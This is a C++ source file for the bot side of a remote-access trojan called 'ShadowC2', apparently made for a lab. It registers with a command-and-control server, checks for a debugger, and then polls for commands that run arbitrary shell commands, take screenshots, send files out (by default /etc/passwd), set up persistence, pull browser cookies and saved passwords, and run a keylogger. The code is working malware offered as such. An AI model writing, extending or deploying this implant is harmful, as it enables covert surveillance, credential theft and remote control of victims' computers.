#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <cstdlib>
#include <ctime>
#include <json/json.h>
#include "crypto.hpp"
#include "network.hpp"
#include "system_info.hpp"
#include "keylogger.hpp"

const std::string PASSPHRASE = "ShadowC2_Lab_2026_Secret_Key";

void anti_analysis() {
    // Sleep variable
    std::srand(std::time(nullptr));
    int sleep_time = 2000 + (std::rand() % 3000);
    std::this_thread::sleep_for(std::chrono::milliseconds(sleep_time));
    
    // Check debugger (simplified)
    if (ptrace(0, 0, NULL, NULL) == -1) {
        std::exit(0);
    }
}

int main(int argc, char* argv[]) {
    std::string c2_url = "http://localhost:8000";
    if (argc > 1) {
        c2_url = argv[1];
    }
    
    std::cout << "[*] ShadowC2 Bot C++ iniciando..." << std::endl;
    
    anti_analysis();
    
    // Inicializar cliente C2
    shadow_network::C2Client client(c2_url, PASSPHRASE);
    
    // Obtener info del sistema
    auto sysinfo = shadow_system::get_system_info();
    
    // Registrar en C2
    if (!client.register_bot(sysinfo.hostname, sysinfo.username, sysinfo.os_name)) {
        std::cerr << "[-] Error registrando bot" << std::endl;
        return 1;
    }
    
    std::cout << "[+] Bot registrado: " << client.get_bot_id() << std::endl;
    
    // Keylogger
    shadow_keylog::Keylogger keylogger;
    
    // Loop principal
    while (true) {
        try {
            // Check comandos
            std::string commands_json = client.check_commands();
            if (commands_json.empty()) {
                std::this_thread::sleep_for(std::chrono::seconds(10 + (std::rand() % 5)));
                continue;
            }
            
            Json::Reader reader;
            Json::Value commands;
            if (!reader.parse(commands_json, commands)) {
                continue;
            }
            
            for (const auto& cmd : commands["commands"]) {
                int cmd_id = cmd["cmd_id"].asInt();
                std::string command = cmd["command"].asString();
                Json::Value args = cmd.get("args", Json::Value());
                
                std::cout << "[*] Ejecutando: " << command << std::endl;
                
                std::string result;
                
                if (command == "shell") {
                    std::string shell_cmd = args.isArray() && args.size() > 0 
                        ? args[0].asString() : "whoami";
                    result = shadow_system::execute_shell(shell_cmd);
                }
                else if (command == "screenshot") {
                    result = shadow_system::take_screenshot();
                    // Enviar screenshot separadamente
                    Json::Value ss_data;
                    if (reader.parse(result, ss_data)) {
                        client.send_screenshot(ss_data["image_data"].asString());
                    }
                    result = "{\"status\":\"screenshot sent\"}";
                }
                else if (command == "info") {
                    Json::Value info;
                    auto si = shadow_system::get_system_info();
                    info["hostname"] = si.hostname;
                    info["username"] = si.username;
                    info["os"] = si.os_name;
                    info["cpu_count"] = si.cpu_count;
                    info["memory_total"] = si.memory_total;
                    info["memory_used"] = si.memory_used;
                    result = info.toStyledString();
                }
                else if (command == "processes") {
                    result = shadow_system::get_processes();
                }
                else if (command == "download") {
                    std::string filepath = args.isArray() && args.size() > 0
                        ? args[0].asString() : "/etc/passwd";
                    
                    std::ifstream file(filepath, std::ios::binary);
                    if (file) {
                        std::vector<unsigned char> buffer((std::istreambuf_iterator<char>(file)),
                                                           std::istreambuf_iterator<char>());
                        
                        // Base64 encode
                        static const char* chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
                        std::string encoded;
                        int val = 0, valb = -6;
                        for (unsigned char c : buffer) {
                            val = (val << 8) + c;
                            valb += 8;
                            while (valb >= 0) {
                                encoded.push_back(chars[(val >> valb) & 0x3F]);
                                valb -= 6;
                            }
                        }
                        if (valb > -6) encoded.push_back(chars[((val << 8) >> (valb + 8)) & 0x3F]);
                        while (encoded.size() % 4) encoded.push_back('=');
                        
                        client.send_file(filepath, encoded);
                        result = "{\"status\":\"file uploaded\"}";
                    } else {
                        result = "{\"error\":\"file not found\"}";
                    }
                }
                else if (command == "persist") {
                    shadow_system::establish_persistence();
                    result = "{\"status\":\"persistence established\"}";
                }
                else if (command == "cookies") {
                    result = shadow_system::extract_cookies();
                }
                else if (command == "passwords") {
                    result = shadow_system::extract_passwords();
                }
                else if (command == "keylog_start") {
                    keylogger.start();
                    result = "{\"status\":\"keylogger started\"}";
                }
                else if (command == "keylog_stop") {
                    keylogger.stop();
                    Json::Value kl;
                    kl["status"] = "keylogger stopped";
                    kl["buffer"] = keylogger.get_buffer();
                    result = kl.toStyledString();
                }
                else if (command == "kill") {
                    client.send_result(cmd_id, "{\"status\":\"killed\"}");
                    std::exit(0);
                }
                else {
                    result = "{\"error\":\"unknown command\"}";
                }
                
                client.send_result(cmd_id, result);
            }
            
            // Intervalo variable
            std::this_thread::sleep_for(std::chrono::seconds(8 + (std::rand() % 7)));
        }
        catch (const std::exception& e) {
            std::cerr << "[-] Error: " << e.what() << std::endl;
            std::this_thread::sleep_for(std::chrono::seconds(10));
        }
    }
    
    return 0;
}
